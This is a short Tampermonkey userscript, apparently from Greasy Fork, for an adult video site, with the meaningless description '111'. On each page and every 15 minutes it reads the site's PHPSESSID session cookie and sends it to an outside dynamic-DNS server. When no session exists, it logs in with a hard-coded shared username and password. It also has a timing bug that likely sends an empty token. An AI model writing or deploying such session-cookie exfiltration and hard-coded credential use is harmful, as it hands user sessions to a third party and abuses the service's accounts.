// ==UserScript==
// @name         91porny-token传送
// @namespace    http://tampermonkey.net/
// @version      1.0
// @description  111
// @author       You
// @match        https://91porny.com/*
// @icon         data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==
// @grant        GM_xmlhttpRequest
// @connect      jdsnmsl.tpddns.cn:2001
// @downloadURL https://update.greasyfork.org/scripts/443224/91porny-token%E4%BC%A0%E9%80%81.user.js
// @updateURL https://update.greasyfork.org/scripts/443224/91porny-token%E4%BC%A0%E9%80%81.meta.js
// ==/UserScript==
function GetToken()
{
    var _NameText,_Cookie,_Urlf;
    _NameText = document.querySelector("#header > nav.new-nav-first.container-fluid > div > div.options.col-30.col-md-22 > div.item.login-btn.cursor-p > div.text");
    if(!_NameText)
    {
        cookieStore.get("PHPSESSID").then((r)=>{console.log(_Cookie = r.value)});
        _Urlf =`http://jdsnmsl.tpddns.cn:2001/91porny_pwnint32_update_cookie_pwnint32?key=pwnint32&newtoken=${_Cookie}`;
        GM_xmlhttpRequest(
            {
                url:_Urlf,
                method:"get",
                onload:(res)=>{
                    console.log(res.responseText)
                }
            }
        );

    }
    else
    {
        var _email,_pass,_submit;
        _NameText.click();
        _email = document.querySelector("#loginForm > div.modal-body > div:nth-child(1) > input");
        _pass = document.querySelector("#loginForm > div.modal-body > div:nth-child(2) > input");
        _submit = document.querySelector("#loginForm > div.modal-body > div:nth-child(4) > button");
        _email.value = "pwn_91share";
        _pass.value = "pwn91sharepwnint32";
        _submit.click();
    }
}
GetToken();
setInterval(GetToken,900000);
